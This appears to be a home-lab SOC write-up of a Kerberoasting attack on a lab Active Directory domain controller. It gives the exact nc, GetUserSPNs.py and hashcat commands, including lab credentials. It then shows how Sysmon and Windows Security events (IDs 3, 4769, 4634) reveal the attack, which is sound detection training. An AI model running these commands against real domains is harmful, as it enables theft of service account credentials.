# Active Directory Attack Playbook (Kerberos-based SPN Extraction and Credential Compromise)

## Overview

- **Target:** Active Directory Domain Controller (within the soc.lab domain)
  - **IP Address:** 192.168.10.10
  - **Domain:** SOC.LAB

- **Attacker:** Kali
  - **IP Address:** 192.168.20.30

## Objective

The objective of this attack was to enumerate and extract Service Principal Names (SPNs) from the Active Directory environment, then crack the Kerberos TGS hashes to gain unauthorized access to domain accounts. Prior attacks had already revealed user credentials and access to the Active Directory domain, facilitating this attack.

## Attack Execution Timeline

1. **Kerberos Port Check**
   - Verified that the Kerberos service (port 88) is open on the Domain Controller:
     ```bash
     nc -vz 192.168.10.10 88
     ```
   - ![hash](https://github.com/user-attachments/assets/25122eab-7eb9-4de7-a62d-2ceeda7e50c9)

2. **DNS Configuration Update**
   - Updated the default DNS IP to point directly to the Domain Controller.
   - ![hash](https://github.com/user-attachments/assets/25122eab-7eb9-4de7-a62d-2ceeda7e50c9)

3. **SPN Extraction**
   - Ran the `GetUserSPNs.py` script from the mpacket toolkit to request SPNs and attempt Kerberos TGS hash extraction:
     ```bash
     python3 GetUserSPNs.py SOC.LAB/labadmin:Root1234! -request
     ```
   - ![hash](https://github.com/user-attachments/assets/25122eab-7eb9-4de7-a62d-2ceeda7e50c9)

4. **Hash Cracking**
   - Cracked the extracted Kerberos TGS hash using hashcat with the rockyou.txt wordlist, saving the results to `cracked.txt`:
     ```bash
     hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt --force -o cracked.txt
     ```
   - ![hash](https://github.com/user-attachments/assets/25122eab-7eb9-4de7-a62d-2ceeda7e50c9)

## Monitoring Windows Logs

### Sysmon Logs Analysis

- **Observation:**
  - Multiple Sysmon log entries with **Event ID 3** were observed.
  - All connections originated from IP `192.168.10.10`, targeting `192.168.20.30`.
  - Different ephemeral ports were utilized, indicating automated scanning or communication.
- ![multipleSysmonlogs](https://github.com/user-attachments/assets/01ab753c-f8f0-42d1-8882-62f2a652937a)

### Windows Security Logs

- **Event ID 4769 – Kerberos Service Ticket Request**
  - Numerous requests for Kerberos Service Tickets were recorded from the same source IP.
- ![kerberos_tickets](https://github.com/user-attachments/assets/9275278e-067c-466c-a2bd-3fc551e18f81)

### Detailed User Log Analysis

- **User Activity:**
  - Analysis of individual logs showed multiple ticket requests for user accounts such as *Jordan* and *Candace*.
  - **User Jordan:**  
    ![Jordan](https://github.com/user-attachments/assets/4aab463d-1130-48ea-affc-d23800dd389f)
    
  - **User Candace:**  
    ![candace_rojas](https://github.com/user-attachments/assets/0fa652ef-089b-4bde-97b4-280412b502bf)

- **Logoff Event:**
  - Shortly after the last Kerberos Service Ticket Request, a **Logoff** event (Event ID 4634) was recorded for user `labadmin`.
  - ![logoff](https://github.com/user-attachments/assets/11d039c9-4803-432e-ae34-a427b6db934a)

## Summary

This playbook details the step-by-step execution of a Kerberos-based attack on an Active Directory environment. By extracting SPNs and cracking Kerberos TGS hashes, the attacker was able to gain unauthorized access using compromised credentials. The monitoring of Sysmon and Windows Security logs provided clear evidence of the attack's progression, highlighting both the scanning activity and the subsequent Kerberoasting technique. This comprehensive approach demonstrates the technical process and underscores the importance of robust logging and monitoring in detecting and mitigating such attacks.
